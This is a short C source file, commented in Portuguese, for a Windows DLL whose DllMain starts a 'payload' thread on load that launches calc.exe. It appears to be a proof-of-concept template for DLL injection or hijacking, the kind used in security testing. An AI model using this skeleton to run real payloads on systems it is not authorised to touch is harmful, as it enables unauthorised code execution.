#include <windows.h>

// Função que será executada em uma thread separada
DWORD WINAPI ExecutePayload(LPVOID lpParam) {
    // Pequena pausa para garantir que a DLL foi totalmente carregada
    Sleep(100);
    
    // Executa a calculadora
    WinExec("calc.exe", SW_SHOW);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Cria uma thread para executar o payload
            // Isso é mais confiável que executar diretamente no DllMain
            CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
            // Opcional: executar também quando novas threads são criadas
            // CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
            break;
    }
    return TRUE;
}